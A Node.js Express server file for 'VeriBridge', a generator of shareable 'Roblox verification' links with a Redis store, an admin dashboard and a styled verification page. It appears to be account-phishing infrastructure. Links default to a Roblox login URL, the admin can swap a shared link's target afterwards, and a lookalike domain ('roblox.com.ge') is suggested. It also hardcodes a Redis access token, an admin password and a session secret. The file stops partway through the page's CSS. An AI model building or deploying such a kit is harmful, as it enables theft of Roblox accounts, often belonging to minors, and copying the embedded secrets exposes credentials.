const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const { Redis } = require('@upstash/redis');

const app = express();

// ==================== CONFIGURATION ====================
const ADMIN_PASSWORD = 'YourStrongPassword123';
const SESSION_SECRET = 'veribridge-secret-2024';

// ==================== REDIS CONNECTION ====================
const redis = new Redis({
    url: "https://certain-sponge-82355.upstash.io",
    token: "gQAAAAAAAUGzAAIncDEyYWU4OGFlYWFkMjQ0NmY3YTBiMWRkMTczM2EyYWM4NHAxODIzNTU",
});

redis.ping().then(() => console.log('[Redis] Connected')).catch(err => console.error('[Redis] Error:', err));

// ==================== ALLOWED DOMAINS ====================
let ALLOWED_DOMAINS = ['roblox.com', 'www.roblox.com', 'web.roblox.com', 'api.roblox.com'];

async function loadDomains() {
    try {
        const saved = await redis.get('allowed_domains');
        if (saved && Array.isArray(saved)) {
            ALLOWED_DOMAINS = saved;
            console.log('[Domains] Loaded from Redis:', ALLOWED_DOMAINS);
        }
    } catch (err) { console.error(err); }
}

async function saveDomains() {
    try {
        await redis.set('allowed_domains', ALLOWED_DOMAINS);
        console.log('[Domains] Saved to Redis:', ALLOWED_DOMAINS);
    } catch (err) { console.error(err); }
}

loadDomains();

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(cookieParser());

// ==================== HELPER FUNCTIONS ====================
function generateCode() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

function isAuthenticated(req, res, next) {
    const token = req.cookies.admin_token;
    if (token === SESSION_SECRET) return next();
    res.status(401).json({ error: 'Unauthorized' });
}

async function getNextId() {
    return await redis.incr('global_next_id');
}

// ==================== PUBLIC API ====================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

app.get('/api/allowed-domains', (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/api/generate', async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'No URL provided' });
    
    let allowed = false;
    for (const domain of ALLOWED_DOMAINS) {
        if (url.includes(domain)) { allowed = true; break; }
    }
    if (!allowed) {
        return res.status(400).json({ error: 'Domain not allowed. Allowed: ' + ALLOWED_DOMAINS.join(', ') });
    }
    
    const code = generateCode();
    const nextId = await getNextId();
    const linkData = { id: nextId, code: code, targetUrl: url, createdAt: Date.now(), clicks: 0, lastAccessed: null };
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    const shareableLink = 'https://' + req.headers.host + '/verify.html?code=' + code;
    console.log('[API] Generated:', code, '->', url);
    res.json({ success: true, shareableLink: shareableLink, code: code });
});

app.get('/api/link/:code', async (req, res) => {
    const { code } = req.params;
    const data = await redis.get(`link:${code}`);
    if (!data) return res.status(404).json({ error: 'Link not found' });
    const linkData = JSON.parse(data);
    linkData.clicks++;
    linkData.lastAccessed = Date.now();
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    res.json({ success: true, targetUrl: linkData.targetUrl });
});

// ==================== ADMIN API ====================
app.get('/admin/api/links', isAuthenticated, async (req, res) => {
    const keys = await redis.keys('link:*');
    const links = [];
    for (const key of keys) {
        const data = await redis.get(key);
        if (data) links.push(JSON.parse(data));
    }
    links.sort((a, b) => b.createdAt - a.createdAt);
    res.json({ success: true, links: links });
});

app.put('/admin/api/links/:code', isAuthenticated, async (req, res) => {
    const { code } = req.params;
    const { targetUrl } = req.body;
    const data = await redis.get(`link:${code}`);
    if (!data) return res.status(404).json({ success: false });
    const linkData = JSON.parse(data);
    linkData.targetUrl = targetUrl;
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    res.json({ success: true });
});

app.delete('/admin/api/links/:code', isAuthenticated, async (req, res) => {
    await redis.del(`link:${req.params.code}`);
    res.json({ success: true });
});

app.get('/admin/api/stats', isAuthenticated, async (req, res) => {
    const keys = await redis.keys('link:*');
    let totalClicks = 0;
    for (const key of keys) {
        const data = await redis.get(key);
        if (data) totalClicks += JSON.parse(data).clicks || 0;
    }
    res.json({ success: true, stats: { totalLinks: keys.length, totalClicks: totalClicks, averageClicks: keys.length ? (totalClicks / keys.length).toFixed(2) : 0 } });
});

app.get('/admin/api/domains', isAuthenticated, (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/domains', isAuthenticated, async (req, res) => {
    let domain = req.body.domain;
    if (!domain) return res.status(400).json({ error: 'No domain provided' });
    domain = domain.toLowerCase().trim();
    if (ALLOWED_DOMAINS.includes(domain)) return res.status(400).json({ error: 'Domain already exists' });
    ALLOWED_DOMAINS.push(domain);
    await saveDomains();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.delete('/admin/api/domains/:domain', isAuthenticated, async (req, res) => {
    const domain = req.params.domain;
    const index = ALLOWED_DOMAINS.indexOf(domain);
    if (index === -1) return res.status(404).json({ error: 'Domain not found' });
    ALLOWED_DOMAINS.splice(index, 1);
    await saveDomains();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie('admin_token', SESSION_SECRET, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, path: '/' });
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.post('/admin/api/logout', (req, res) => {
    res.clearCookie('admin_token', { path: '/' });
    res.json({ success: true });
});

// ==================== ADMIN LOGIN PAGE ====================
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>
        body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .login-box{background:rgba(0,0,0,0.5);padding:40px;border-radius:20px;border:1px solid cyan;width:350px}
        h1{color:white;text-align:center}
        input{width:100%;padding:12px;margin:10px 0;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
        button{width:100%;padding:12px;background:cyan;color:black;border:none;border-radius:10px;font-weight:bold;cursor:pointer}
        .error{color:red;text-align:center}
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Admin Login</h1>
        <input type="password" id="password" placeholder="Enter password">
        <button onclick="login()">Login</button>
        <div id="error" class="error"></div>
    </div>
    <script>
        async function login() {
            var pwd = document.getElementById('password').value;
            var res = await fetch('/admin/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pwd })
            });
            var data = await res.json();
            if (data.success) {
                window.location.href = '/admin/dashboard';
            } else {
                document.getElementById('error').innerText = 'Invalid password';
            }
        }
    </script>
</body>
</html>`);
});

// ==================== ADMIN DASHBOARD ====================
app.get('/admin/dashboard', isAuthenticated, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <style>
        body{background:#0a0f1e;color:white;font-family:Arial;padding:20px}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px}
        h1{color:#00ffff}
        .logout-btn{background:#ff5555;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}
        .tabs{display:flex;gap:10px;margin-bottom:30px;border-bottom:1px solid rgba(0,255,255,0.2);padding-bottom:10px}
        .tab-btn{background:transparent;border:none;padding:10px 20px;color:#9ab3cc;cursor:pointer;border-radius:8px}
        .tab-btn:hover{background:rgba(0,255,255,0.1);color:#00ffff}
        .tab-btn.active{background:rgba(0,255,255,0.2);color:#00ffff}
        .tab-content{display:none}.tab-content.active{display:block}
        .stats{display:flex;gap:20px;margin-bottom:30px}
        .stat-card{background:rgba(0,0,0,0.3);border:1px solid cyan;border-radius:15px;padding:20px;text-align:center;flex:1}
        .stat-number{font-size:36px;font-weight:bold;color:#00ffff}
        .search-box{margin-bottom:20px}
        .search-box input{width:100%;padding:12px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
        table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.3);border-radius:15px;overflow:hidden}
        th,td{padding:12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1)}
        th{background:rgba(0,255,255,0.1);color:#00ffff}
        .edit-btn{background:#2c5a7a;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
        .delete-btn{background:#ff5555;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}
        .modal-content{background:#1a1a2e;padding:30px;border-radius:20px;width:400px;border:1px solid cyan}
        .modal-content input{width:100%;padding:10px;margin:10px 0;background:#333;border:1px solid cyan;border-radius:10px;color:white}
        .save-btn{background:#00aa00;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
        .cancel-btn{background:#555;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
        .domains-list{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px}
        .domain-tag{background:rgba(0,255,255,0.2);border:1px solid cyan;padding:8px 15px;border-radius:20px;display:flex;align-items:center;gap:10px}
        .domain-tag button{background:#ff5555;border:none;color:white;border-radius:50%;width:20px;height:20px;cursor:pointer}
        .add-domain{display:flex;gap:10px;margin-top:20px}
        .add-domain input{flex:1;padding:10px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
        .add-domain button{background:#00aa00;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}
        .info-box{background:rgba(0,255,255,0.1);border-radius:10px;padding:15px;margin-top:20px;font-size:13px}
        .refresh-btn{background:#2c5a7a;border:none;padding:8px 16px;border-radius:8px;color:white;cursor:pointer;margin-left:10px}
    </style>
</head>
<body>
<div class="header">
    <h1>Admin Dashboard</h1>
    <div>
        <button class="refresh-btn" onclick="loadLinks()">Refresh</button>
        <button class="logout-btn" onclick="logout()">Logout</button>
    </div>
</div>
<div class="tabs">
    <button class="tab-btn active" id="tabLinksBtn">Manage Links</button>
    <button class="tab-btn" id="tabDomainsBtn">Allowed Domains</button>
</div>
<div id="linksTab" class="tab-content active">
    <div class="stats">
        <div class="stat-card"><div class="stat-number" id="totalLinks">0</div><div>Total Links</div></div>
        <div class="stat-card"><div class="stat-number" id="totalClicks">0</div><div>Total Clicks</div></div>
        <div class="stat-card"><div class="stat-number" id="avgClicks">0</div><div>Avg Clicks</div></div>
    </div>
    <div class="search-box">
        <input type="text" id="searchInput" placeholder="Search by URL or code...">
        <button onclick="loadLinks()">Search</button>
        <button onclick="clearSearch()">Clear</button>
    </div>
    <div style="overflow-x:auto">
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Code</th>
                    <th>URL</th>
                    <th>Clicks</th>
                    <th>Created</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="tableBody"></tbody>
        </table>
    </div>
</div>
<div id="domainsTab" class="tab-content">
    <h3>Allowed Domains</h3>
    <div id="domainsList" class="domains-list">Loading...</div>
    <div class="add-domain">
        <input type="text" id="newDomain" placeholder="Enter domain (e.g., roblox.com.ge)">
        <button onclick="addDomain()">Add Domain</button>
    </div>
    <div class="info-box">Add domains to allow users to shorten URLs from them. Changes take effect immediately.</div>
</div>
<div id="editModal" class="modal">
    <div class="modal-content">
        <h3>Edit Link</h3>
        <input type="text" id="editCode" readonly>
        <input type="text" id="editUrl" placeholder="New URL">
        <button class="save-btn" onclick="saveEdit()">Save</button>
        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
    </div>
</div>
<script>
    document.getElementById('tabLinksBtn').onclick = function() {
        document.getElementById('tabLinksBtn').classList.add('active');
        document.getElementById('tabDomainsBtn').classList.remove('active');
        document.getElementById('linksTab').classList.add('active');
        document.getElementById('domainsTab').classList.remove('active');
        loadLinks();
    };
    
    document.getElementById('tabDomainsBtn').onclick = function() {
        document.getElementById('tabDomainsBtn').classList.add('active');
        document.getElementById('tabLinksBtn').classList.remove('active');
        document.getElementById('domainsTab').classList.add('active');
        document.getElementById('linksTab').classList.remove('active');
        loadDomains();
    };
    
    function showToast(msg, type) {
        type = type || 'success';
        var t = document.createElement('div');
        t.className = 'toast ' + type;
        t.innerText = msg;
        document.body.appendChild(t);
        setTimeout(function() { t.remove(); }, 3000);
    }
    
    async function loadDomains() {
        try {
            var r = await fetch('/admin/api/domains');
            if (r.status === 401) {
                window.location.href = '/admin';
                return;
            }
            var d = await r.json();
            if (d.success) {
                var html = '';
                for (var i = 0; i < d.domains.length; i++) {
                    html += '<div class="domain-tag">' + d.domains[i] + '<button onclick="removeDomain(\'' + d.domains[i] + '\')">✕</button></div>';
                }
                document.getElementById('domainsList').innerHTML = html;
            }
        } catch(e) { console.error(e); }
    }
    
    async function addDomain() {
        var input = document.getElementById('newDomain');
        var domain = input.value.trim().toLowerCase();
        if (!domain) {
            showToast('Please enter a domain', 'error');
            return;
        }
        try {
            var r = await fetch('/admin/api/domains', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ domain: domain })
            });
            var d = await r.json();
            if (d.success) {
                loadDomains();
                input.value = '';
                showToast('Domain added!');
            } else {
                showToast(d.error || 'Failed', 'error');
            }
        } catch(e) { showToast('Error', 'error'); }
    }
    
    async function removeDomain(domain) {
        if (!confirm('Remove "' + domain + '"?')) return;
        try {
            var r = await fetch('/admin/api/domains/' + encodeURIComponent(domain), { method: 'DELETE' });
            var d = await r.json();
            if (d.success) {
                loadDomains();
                showToast('Domain removed!');
            } else {
                showToast(d.error || 'Failed', 'error');
            }
        } catch(e) { showToast('Error', 'error'); }
    }
    
    async function loadLinks() {
        var search = document.getElementById('searchInput').value;
        var url = search ? '/admin/api/links?search=' + encodeURIComponent(search) : '/admin/api/links';
        try {
            var r = await fetch(url);
            if (r.status === 401) {
                window.location.href = '/admin';
                return;
            }
            var d = await r.json();
            if (d.success) {
                var links = d.links || [];
                var totalClicks = 0;
                for (var i = 0; i < links.length; i++) {
                    totalClicks += links[i].clicks || 0;
                }
                document.getElementById('totalLinks').innerText = links.length;
                document.getElementById('totalClicks').innerText = totalClicks;
                document.getElementById('avgClicks').innerText = links.length ? (totalClicks / links.length).toFixed(2) : 0;
                
                var tbody = document.getElementById('tableBody');
                if (links.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No links found</div>--');
                    return;
                }
                var html = '';
                for (var i = 0; i < links.length; i++) {
                    var l = links[i];
                    html += '<tr>' +
                        '<td>' + (l.id || (i + 1)) + '</td>' +
                        '<td><code>' + l.code + '</code></td>' +
                        '<td style="max-width:300px;word-break:break-all">' + l.targetUrl + '</td>' +
                        '<td>' + (l.clicks || 0) + '</td>' +
                        '<td>' + new Date(l.createdAt).toLocaleString() + '</td>' +
                        '<td><button class="edit-btn" onclick="openEdit(\'' + l.code + '\')">Edit</button> <button class="delete-btn" onclick="deleteLink(\'' + l.code + '\')">Delete</button></td>' +
                        '</tr>';
                }
                tbody.innerHTML = html;
            }
        } catch(e) { console.error(e); }
    }
    
    var currentEditCode = null;
    
    async function openEdit(code) {
        var r = await fetch('/admin/api/links/' + code);
        var d = await r.json();
        if (d.success) {
            document.getElementById('editCode').value = d.link.code;
            document.getElementById('editUrl').value = d.link.targetUrl;
            document.getElementById('editModal').style.display = 'flex';
            currentEditCode = code;
        }
    }
    
    async function saveEdit() {
        var newUrl = document.getElementById('editUrl').value;
        await fetch('/admin/api/links/' + currentEditCode, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ targetUrl: newUrl })
        });
        closeModal();
        loadLinks();
        showToast('Link updated!');
    }
    
    async function deleteLink(code) {
        if (confirm('Delete this link?')) {
            await fetch('/admin/api/links/' + code, { method: 'DELETE' });
            loadLinks();
            showToast('Link deleted!');
        }
    }
    
    function closeModal() {
        document.getElementById('editModal').style.display = 'none';
    }
    
    function clearSearch() {
        document.getElementById('searchInput').value = '';
        loadLinks();
    }
    
    async function logout() {
        await fetch('/admin/api/logout', { method: 'POST' });
        window.location.href = '/admin';
    }
    
    loadLinks();
    setInterval(loadLinks, 30000);
</script>
</body>
</html>`);
});

// ==================== GENERATOR PAGE ====================
app.get('/gen', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>VeriBridge Gen | Create Shareable Links</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 200% 0; }
        }
        .shine-text {
            background: linear-gradient(100deg, #ffffff 45%, #00ffff 50%, #ffffff 55%);
            background-size: 200% auto;
            color: transparent;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shine 4s linear infinite;
        }
        .loading-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .allowed-domains {
            background: rgba(0, 255, 255, 0.1);
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            font-size: 11px;
            color: #00ffff;
        }
        .allowed-domains span {
            display: inline-block;
            background: rgba(0, 255, 255, 0.2);
            padding: 2px 8px;
            border-radius: 20px;
            margin: 2px;
        }
    </style>
</head>
<body class="bg-black text-white">
    <div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
    <div class="flex min-h-screen items-center justify-center p-4">
        <div class="w-full max-w-2xl text-center">
            <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8">
                <h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1>
                <p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p>
                <div class="space-y-4">
                    <input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white" placeholder="https://www.roblox.com/login">
                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500 transition-all">
                        Generate Shareable Link
                    </button>
                    <div id="allowedDomains" class="allowed-domains">
                        <strong>✅ Allowed Domains:</strong> <span id="domainsList">Loading...</span>
                    </div>
                    <div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30">
                        <p class="text-xs text-cyan-300/80 mb-2">✨ Your Shareable Link (works for ANYONE):</p>
                        <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code>
                        <div class="flex gap-2 mt-3">
                            <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button>
                            <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button>
                        </div>
                    </div>
                    <div id="errorMsg" class="text-red-400 text-sm"></div>
                    <div class="text-xs text-white/30 pt-4 border-t border-white/10">
                        <p>✅ <span class="text-green-400">VALIDATED URLs!</span> Only allowed Roblox domains work</p>
                        <p>🔗 Links never expire - stored permanently on Redis</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const targetUrl = document.getElementById('targetUrl');
        const generateBtn = document.getElementById('generateBtn');
        const resultSection = document.getElementById('resultSection');
        const resultUrl = document.getElementById('resultUrl');
        const copyBtn = document.getElementById('copyBtn');
        const testBtn = document.getElementById('testBtn');
        const errorMsg = document.getElementById('errorMsg');
        const domainsList = document.getElementById('domainsList');

        async function loadAllowedDomains() {
            try {
                const response = await fetch('/api/allowed-domains');
                const data = await response.json();
                if (data.success) {
                    let html = '';
                    for (let i = 0; i < data.domains.length; i++) {
                        html += '<span>' + data.domains[i] + '</span>';
                    }
                    domainsList.innerHTML = html;
                }
            } catch (err) {
                domainsList.innerHTML = '<span>roblox.com</span><span>www.roblox.com</span>';
            }
        }
        loadAllowedDomains();

        async function generateLink() {
            let url = targetUrl.value.trim();
            if (!url) {
                errorMsg.innerText = '❌ Please enter a URL';
                return;
            }
            errorMsg.innerText = '';
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<div class="loading-spinner"></div><span> Validating URL...</span>';
            try {
                const response = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });
                const data = await response.json();
                if (data.success) {
                    resultUrl.innerText = data.shareableLink;
                    resultSection.classList.remove('hidden');
                } else {
                    errorMsg.innerText = '❌ ' + data.error;
                    if (data.allowedDomains) {
                        errorMsg.innerText += '\\n\\nAllowed domains: ' + data.allowedDomains.join(', ');
                    }
                    resultSection.classList.add('hidden');
                }
            } catch (err) {
                console.error('Error:', err);
                errorMsg.innerText = '❌ Cannot connect to server. Please try again.';
                resultSection.classList.add('hidden');
            } finally {
                generateBtn.disabled = false;
                generateBtn.innerHTML = 'Generate Shareable Link';
            }
        }

        generateBtn.addEventListener('click', generateLink);
        copyBtn.addEventListener('click', function() {
            navigator.clipboard.writeText(resultUrl.innerText);
        });
        testBtn.addEventListener('click', function() {
            window.open(resultUrl.innerText, '_blank');
        });
        targetUrl.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') generateLink();
        });
        setInterval(loadAllowedDomains, 30000);
    </script>
</body>
</html>`);
});

// ==================== VERIFICATION PAGE (FIXED - NO X-FRAME-BYPASS) ====================
app.get('/verify.html', (req, res) => {
    const code = req.query.code;
    if (!code) {
        res.send('<h1>Invalid link</h1><a href="/gen">Go to Generator</a>');
        return;
    }
    
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>veribridge | Roblox Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins','Segoe UI','Inter',system-ui,sans-serif}
        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e 0%,#0a1a2f 50%,#0b2b3b 100%);overflow-x:hidden;position:relative}
        .frost-overlay{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;background:radial-gradient(circle at 20% 40%,rgba(173,216,230,0.03) 0%,transparent 70%);z-index:1}
        .premium-container{max-width:1400px;margin:0 auto;padding:1rem;position:relative;z-index:20}
        @media(min-width:768px){.premium-container{padding:1.5rem}}
        .golden-header{text-align:center;margin-bottom:0.5rem}
        .premium-logo-gold{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:rgba(0,0,0,0.5);backdrop-filter:blur(20px);padding:0.5rem 1rem;border-radius:60px;border:1px solid rgba(100,200,255,0.6);box-shadow:0 8px 32px rgba(0,0,0,0.3);margin-bottom:0.5rem;flex-wrap:wrap}
        .brand-logo{height:35px;width:auto;max-width:120px;object-fit:contain}
        @media(min-width:768px){.brand-logo{height:45px;max-width:160px}}
        .gold-badge{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);padding:3px 10px;border-radius:40px;font-size:0.6rem;font-weight:bold;color:#8dd0ff}
        .brand-container{text-align:center;margin-bottom:0.5rem;padding:0.3rem 0}
        .brand-main{font-size:3rem;font-weight:800;letter-spacing:-1px;margin-bottom:0.2rem}
        @media(min-width:768px){.brand-main{font-size:4rem}}
        .veri-white{color:#ffffff}
        .bridge-purple{background:linear-gradient(135deg,#c084fc,#a855f7,#7c3aed);background-clip:text;-webkit-background-clip:text;color:transparent}
        .brand-subtitle{font-size:1.2rem;font-weight:600;margin-top:0.1rem}
        @media(min-width:768px){.brand-subtitle{font-size:1.5rem}}
        .bringing-white{color:#ffffff}
        .roblox-red{color:#ff4d4d}
        .to-white{color:#ffffff}
        .discord-blue{color:#5865F2}
        .description-text{font-size:0.85rem;color:#9ab3cc;max-width:600px;margin:0.8rem auto 0;line-height:1.5}
        .username-row{display:flex;flex-direction:row;align-items:center;justify-content:center;gap:10px;max-width:550px;margin:1rem auto;flex-wrap:wrap}
        .username-input{flex:2;min-width:200px;background:rgba(0,0,0,0.5);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:0.9rem 1.2rem;font-size:0.95rem;color:#ffffff;outline:none}
        .username-input:focus{border-color:#8dd0ff;box-shadow:0 0 0 3px rgba(100,200,255,0.2)}
        .get-started-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:0.9rem 1.8rem;border-radius:60px;font-weight:700;font-size:0.95rem;color:white;cursor:pointer;transition:all 0.2s}
        .error-msg{color:#ff5555;font-size:0.7rem;text-align:center;margin-top:0.3rem;display:none}
        .error-msg.show{display:block}
        .legal-note{font-size:0.65rem;color:#7e95b5;text-align:center;margin-top:0.5rem}
        .rating-stars{color:#ffc107;font-size:0.8rem;text-align:center;margin-top:0.8rem}
        .features-section{margin:3rem 0 2rem}
        .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:1.8rem}
        .feature-card{background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);border-radius:1.2rem;padding:1.5rem;border:1px solid rgba(100,200,255,0.2)}
        .feature-card h3{font-size:1.2rem;font-weight:600;color:#cceeff;margin-bottom:0.8rem}
        .feature-card p{color:#9ab3cc;font-size:0.85rem;line-height:1.5}
        .section-title{font-size:1.6rem;font-weight:700;text-align:center;margin-bottom:2rem;background:linear-gradient(135deg,#ffffff,#8dd0ff);background-clip:text;-webkit-background-clip:text;color:transparent}
        .dashboard-gold{display:flex;flex-direction:column;gap:1rem;margin-top:2rem}
        @media(min-width:900px){.dashboard-gold{display:grid;grid-template-columns:300px 1fr;gap:1.5rem}}
        .verification-sidebar-gold{background:rgba(0,0,0,0.45);backdrop-filter:blur(16px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}
        .sidebar-gold-header{background:linear-gradient(115deg,rgba(100,200,255,0.2),rgba(100,200,255,0.1));padding:1rem;text-align:center;border-bottom:2px solid rgba(100,200,255,0.6)}
        .sidebar-gold-header h2{font-size:1rem;color:#8dd0ff}
        .verify-options-gold{padding:0.8rem}
        .verify-card-gold{background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);border-radius:1rem;padding:0.8rem;margin-bottom:0.8rem;cursor:pointer;border:1px solid rgba(100,200,255,0.3)}
        .verify-card-gold.active{background:linear-gradient(145deg,rgba(100,200,255,0.25),rgba(100,200,255,0.15));border-color:#8dd0ff;box-shadow:0 4px 20px rgba(100,200,255,0.3)}
        .method-letter-circle{width:42px;height:42px;border-radius:50%;background:rgba(100,200,255,0.15);border:1.5px solid #8dd0ff;display:flex;align-items:center;justify-content:center;margin-bottom:0.5rem}
        .method-letter{font-size:1.2rem;font-weight:700;color:#8dd0ff}
        .card-title-gold{font-weight:700;color:#cceeff;margin-bottom:0.2rem;font-size:0.9rem}
        .card-desc-gold{font-size:0.65rem;color:#9ab3cc}
        .verify-badge-gold{display:inline-block;margin-top:6px;font-size:0.55rem;background:rgba(0,0,0,0.6);padding:2px 8px;border-radius:20px;color:#8dd0ff}
        .login-viewer-gold{background:rgba(0,0,0,0.4);backdrop-filter:blur(20px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}
        .viewer-header-gold{background:rgba(0,0,0,0.5);padding:0.8rem 1rem;border-bottom:1px solid rgba(100,200,255,0.5);display:flex;flex-direction:column;align-items:center;gap:10px}
        @media(min-width:600px){.viewer-header-gold{flex-direction:row;justify-content:space-between}}
        .method-indicator-gold{display:flex;align-items:center;gap:10px}
        .method-indicator-circle{width:28px;height:28px;border-radius:50%;background:rgba(100,200,255,0.2);border:1px solid #8dd0ff;display:flex;align-items:center;justify-content:center}
        .method-indicator-letter{font-size:0.9rem;font-weight:700;color:#8dd0ff}
        .method-name-gold{color:#cceeff;font-weight:600;font-size:0.9rem}
        .status-chip-gold{background:rgba(0,0,0,0.6);padding:4px 10px;border-radius:40px;font-size:0.65rem;color:#8dd0ff}
        .roblox-auth-section{padding:1.5rem;background:rgba(0,0,0,0.3);border-radius:1rem;margin:1rem}
        .auth-input-group{display:flex;gap:10px;flex-wrap:wrap;flex-direction:column}
        .roblox-username-input{width:100%;background:rgba(0,0,0,0.6);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:12px 20px;color:#ffffff;font-size:0.9rem;outline:none}
        .verify-roblox-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 24px;border-radius:60px;font-weight:bold;color:white;cursor:pointer;margin-top:10px}
        .user-profile-preview{display:none;align-items:center;gap:15px;padding:15px;background:rgba(0,0,0,0.5);border-radius:1rem;margin-top:15px}
        .user-profile-preview.show{display:flex}
        .preview-avatar{width:60px;height:60px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
        .preview-info h4{color:#ffffff;font-size:1rem}
        .redirect-container{padding:1rem 1.5rem 1.5rem;text-align:center}
        .welcome-text{color:#ffffff;font-size:1rem;margin-bottom:0.5rem}
        .redirect-desc{color:#cceeff;font-size:0.85rem;margin-bottom:0.5rem}
        .bottom-start-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 28px;border-radius:60px;font-weight:bold;font-size:1rem;color:white;cursor:pointer;margin-top:1rem}
        .bottom-start-btn:disabled{opacity:0.5;cursor:not-allowed}
        .footer-gold{text-align:center;margin-top:2rem;font-size:0.6rem;color:#9ab3cc}
        .fullscreen-loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;opacity:0;visibility:hidden}
        .fullscreen-loading.active{opacity:1;visibility:visible}
